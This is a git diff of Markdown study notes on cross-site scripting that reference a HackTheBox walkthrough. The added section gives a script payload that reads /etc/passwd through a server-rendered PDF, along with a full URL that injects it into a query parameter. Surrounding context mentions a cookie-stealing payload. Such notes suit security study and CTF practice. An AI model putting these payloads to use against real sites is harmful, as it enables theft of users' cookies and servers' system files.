@@ -6,9 +6,12 @@ XSS attacks can be used to steal sensitive information, such as login credential
 
 # Guide
 
+1. Remember it relies on an external user and therefor may be unreliable, this may take time or multiple login attempts.
+2. The value which gets displayed and can be modified may be in a strange place, check the URL and request parameters.
+
 # Walkthrough
 
-[HTB: Holiday | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/09/11/htb-holiday.html)
+1. [HTB: Holiday | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/09/11/htb-holiday.html)
 
 # Examples
 
@@ -27,3 +30,20 @@ r.send();
 ```
 
 Sending this HTML to the website which will display it will steal the cookie from any user who views it.
+
+## Running Code
+
+[Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
+
+```
+<script>
+	x=new XMLHttpRequest;
+	x.onload=function(){
+		document.write(this.responseText)
+	};
+	x.open("GET","file:///etc/passwd");
+	x.send();
+</script>
+```
+
+`https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>&date=2017-08-11&settlement_type=all&advice_id=undefined`
